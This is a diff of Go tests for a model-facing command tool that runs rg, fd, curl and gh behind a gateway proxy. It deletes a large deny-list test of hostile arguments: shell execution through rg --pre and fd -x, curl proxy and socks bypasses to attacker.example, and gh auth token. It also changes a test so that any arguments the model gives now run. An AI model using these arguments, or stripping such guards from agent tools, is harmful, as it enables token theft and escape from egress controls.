@@ -396,8 +396,34 @@ func TestRunToolRecordsCurlSources(t *testing.T) {
 	}
 }
 
+// TestRunToolSourcesLeaveOutTheProxy: the gateway's URL, given to curl as
+// a proxy option's value, is not a source, in whatever case its host is.
+func TestRunToolSourcesLeaveOutTheProxy(t *testing.T) {
+	self, err := os.Executable()
+	if err != nil {
+		t.Fatal(err)
+	}
+	rt := NewRunTool(RunConfig{
+		Dir: t.TempDir(), Commands: map[string]string{"curl": self}, Timeout: 2 * time.Second, MaxOutputBytes: 4096, Proxied: true,
+		Env: []string{helperEnv + "=1", "GOCOVERDIR=" + t.TempDir(),
+			"HTTPS_PROXY=http://:tok@kritika-gateway.kritika.svc:8082", "http_proxy=http://:tok@kritika-gateway.kritika.svc:8082"},
+	})
+	for _, input := range []string{
+		`{"command":"curl","args":["--proxy","http://:tok@kritika-gateway.kritika.svc:8082","https://example.com/a"]}`,
+		`{"command":"curl","args":["-x","http://KRITIKA-GATEWAY.kritika.svc:8082","--proxy-user",":tok","http://example.com/b"]}`,
+		`{"command":"curl","args":["--proxy","http://:tok@kritika-gateway.kritika.svc.:8082","https://example.com/a"]}`,
+	} {
+		if _, err := rt.Run(t.Context(), json.RawMessage(input)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if got := rt.Sources(); !slices.Equal(got, []string{"https://example.com/a", "https://example.com/b"}) {
+		t.Fatalf("sources = %q", got)
+	}
+}
+
 // TestRunToolRecordsRan: the commands run are listed once each in first-use
-// order, and one the tool does not offer or refuses is not among them.
+// order, and one the tool does not offer is not among them.
 func TestRunToolRecordsRan(t *testing.T) {
 	rt, _ := newTestRunTool(t, false)
 	if got := rt.Ran(); got == nil || len(got) != 0 {
@@ -406,11 +432,11 @@ func TestRunToolRecordsRan(t *testing.T) {
 	for _, input := range []string{
 		`{"command":"rg","args":["x"]}`,
 		`{"command":"curl","args":["https://example.com/"]}`,
-		`{"command":"rg","args":["--pre","cat","y"]}`,
+		`{"command":"rg","args":["y"]}`,
 		`{"command":"fd","args":["x"]}`,
 	} {
-		// The unoffered and the refused calls fail, which the loop reports to
-		// the model; only what ran is recorded.
+		// The unoffered call fails, which the loop reports to the model; only
+		// what ran is recorded.
 		_, _ = rt.Run(t.Context(), json.RawMessage(input))
 	}
 	if got := rt.Ran(); !slices.Equal(got, []string{"rg", "curl"}) {
@@ -418,98 +444,9 @@ func TestRunToolRecordsRan(t *testing.T) {
 	}
 }
 
-// TestRunToolGH: only gh is given its extra environment, what it reads is
-// a source, and the tool steers GitHub lookups to it.
-func TestRefusedArgs(t *testing.T) {
-	tests := []struct {
-		command string
-		args    []string
-		refused bool
-	}{
-		{"gh", []string{"api", "repos/a/b"}, false},
-		{"gh", []string{"release", "view", "auth", "-R", "a/b"}, false},
-		{"gh", []string{"auth", "token"}, true},
-		{"gh", []string{"--help", "auth", "status", "--show-token"}, true},
-		{"gh", []string{"--hostname", "github.com", "auth", "token"}, true},
-		{"gh", []string{"-R", "a/b", "auth", "status"}, true},
-		{"gh", []string{"--pin", "v1", "extension", "install", "o/r"}, true},
-		{"gh", []string{"--repo=a/b", "api", "auth"}, false},
-		{"gh", []string{"--hostname", "auth", "token"}, false},
-		{"gh", []string{"alias", "set", "x", "!env"}, true},
-		{"gh", []string{"extension", "exec", "x"}, true},
-		{"gh", []string{"config", "list"}, true},
-		{"rg", []string{"-C", "3", "pattern"}, false},
-		{"rg", []string{"--pre-glob", "*.pdf", "pattern"}, false},
-		{"rg", []string{"--regexp=--pre"}, false},
-		{"rg", []string{"--regexp=--hostname-bin"}, false},
-		{"rg", []string{"--", "./--pre"}, false},
-		{"rg", []string{"--", "--pre"}, true},
-		{"rg", []string{"-e", "--", "--pre", "sh", "file"}, true},
-		{"rg", []string{"--regexp", "--", "--pre=sh", "file"}, true},
-		{"rg", []string{"-e", "--", "--hostname-bin=sh", "file"}, true},
-		{"rg", []string{"--pre", "sh", "pattern"}, true},
-		{"rg", []string{"--pre=sh", "pattern"}, true},
-		{"rg", []string{"--hostname-bin=sh", "pattern"}, true},
-		{"fd", []string{"-e", "yaml", "values"}, false},
-		{"fd", []string{"-exml"}, false},
-		{"fd", []string{"-HI", "-t", "x", "name"}, false},
-		{"fd", []string{"--", "./-x"}, false},
-		{"fd", []string{"--", "-x"}, true},
-		{"fd", []string{"--and", "--", "-x", "echo", "HIT"}, true},
-		{"fd", []string{"--and", "--", "--exec-batch=echo"}, true},
-		{"fd", []string{".", "-x", "sh", "-c", "id"}, true},
-		{"fd", []string{"-HIX", "sh"}, true},
-		{"fd", []string{"--exec", "sh"}, true},
-		{"fd", []string{"--exec-batch=sh"}, true},
-		{"curl", []string{"-sv", "-o", "-", "https://example.com/"}, false},
-		{"curl", []string{"--trace-ids", "--trace-time", "-v", "https://example.com/"}, false},
-		{"curl", []string{"-", "-X", "GET", "https://example.com/"}, false},
-		{"curl", []string{"--trace", "-", "https://example.com/"}, true},
-		{"curl", []string{"--trace-ascii=-", "https://example.com/"}, true},
-		{"curl", []string{"--trace-config", "all", "-v", "https://example.com/"}, true},
-		{"curl", []string{"--config", "curlrc", "https://example.com/"}, true},
-		{"curl", []string{"-K", "curlrc", "https://example.com/"}, true},
-		{"curl", []string{"-sKcurlrc", "https://example.com/"}, true},
-		{"curl", []string{"--variable", "f=-", "--expand-trace", "{{f}}", "http://example.com/"}, true},
-		{"curl", []string{"--expand-config", "curlrc", "http://example.com/"}, true},
-		{"curl", []string{"--noproxy", "*", "http://attacker.example:5432/"}, true},
-		{"curl", []string{"--noproxy=*", "http://attacker.example:5432/"}, true},
-		{"curl", []string{"--expand-noproxy", "*", "http://attacker.example:5432/"}, true},
-		{"curl", []string{"-x", "", "http://attacker.example:5432/"}, true},
-		{"curl", []string{"-Lsx", "", "http://attacker.example:5432/"}, true},
-		{"curl", []string{"-xattacker.example:5432", "http://198.51.100.1/"}, true},
-		{"curl", []string{"--proxy", "", "http://attacker.example:5432/"}, true},
-		{"curl", []string{"--proxy1.0", "attacker.example:5432", "http://198.51.100.1/"}, true},
-		{"curl", []string{"--preproxy", "attacker.example:5432", "http://198.51.100.1/"}, true},
-		{"curl", []string{"--socks4", "attacker.example:5432", "http://198.51.100.1/"}, true},
-		{"curl", []string{"--socks4a", "attacker.example:5432", "http://198.51.100.1/"}, true},
-		{"curl", []string{"--socks5", "attacker.example:5432", "http://198.51.100.1/"}, true},
-		{"curl", []string{"--socks5-hostname", "attacker.example:5432", "http://198.51.100.1/"}, true},
-		{"curl", []string{"--resolve", "gateway:8082:198.51.100.1", "http://example.com/"}, true},
-		{"curl", []string{"--unix-socket", "s.sock", "http://example.com/"}, true},
-		{"curl", []string{"--expand-abstract-unix-socket=s", "http://example.com/"}, true},
-		{"curl", []string{"--proto", "all", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"--proto=+telnet", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"http://example.com/", "--next", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"http://example.com/", "-:", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"http://example.com/", "-s:", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"-q", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"-qs", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"--disable", "telnet://attacker.example:5432"}, true},
-		{"curl", []string{"-Hx-api-key: k", "-XK", "-otext.txt", "http://example.com/"}, false},
-		{"curl", []string{"-U", "u:p", "--proto-redir", "=https", "--connect-to", "::example.org:", "http://example.com/"}, false},
-		{"jq", []string{"-x", "."}, false},
-	}
-	for _, tt := range tests {
-		t.Run(tt.command+" "+strings.Join(tt.args, " "), func(t *testing.T) {
-			if why := refusedArgs(tt.command, tt.args); (why != "") != tt.refused {
-				t.Fatalf("refusedArgs = %q, want refused %v", why, tt.refused)
-			}
-		})
-	}
-}
-
-func TestRunToolRefusesAndMasks(t *testing.T) {
+// TestRunToolMasks: a command runs with whatever arguments the model gives,
+// and the token it was handed is masked out of what it prints.
+func TestRunToolMasks(t *testing.T) {
 	self, err := os.Executable()
 	if err != nil {
 		t.Fatal(err)
@@ -520,15 +457,14 @@ func TestRunToolRefusesAndMasks(t *testing.T) {
 		Commands:   map[string]string{"gh": self}, Timeout: 2 * time.Second, MaxOutputBytes: 4096,
 		Mask: func(s string) string { return strings.ReplaceAll(s, "ghs_run", "***") },
 	})
-	if out, err := rt.Run(t.Context(), json.RawMessage(`{"command":"gh","args":["auth","token"]}`)); err == nil {
-		t.Fatalf("gh auth token ran: %q", out)
-	}
-	out, err := rt.Run(t.Context(), json.RawMessage(`{"command":"gh","args":["api","user"]}`))
-	if err != nil || strings.Contains(out, "ghs_run") || !strings.Contains(out, "env=GH_TOKEN=***") {
-		t.Fatalf("out = %q, %v; want the token masked", out, err)
+	out, err := rt.Run(t.Context(), json.RawMessage(`{"command":"gh","args":["auth","token"]}`))
+	if err != nil || strings.Contains(out, "ghs_run") || !strings.Contains(out, "env=GH_TOKEN=***") || !strings.Contains(out, "arg=auth") {
+		t.Fatalf("out = %q, %v; want the call run and the token masked", out, err)
 	}
 }
 
+// TestRunToolGH: only gh is given its extra environment, what it reads is
+// a source, and the tool steers GitHub lookups to it.
 func TestRunToolGH(t *testing.T) {
 	self, err := os.Executable()
 	if err != nil {
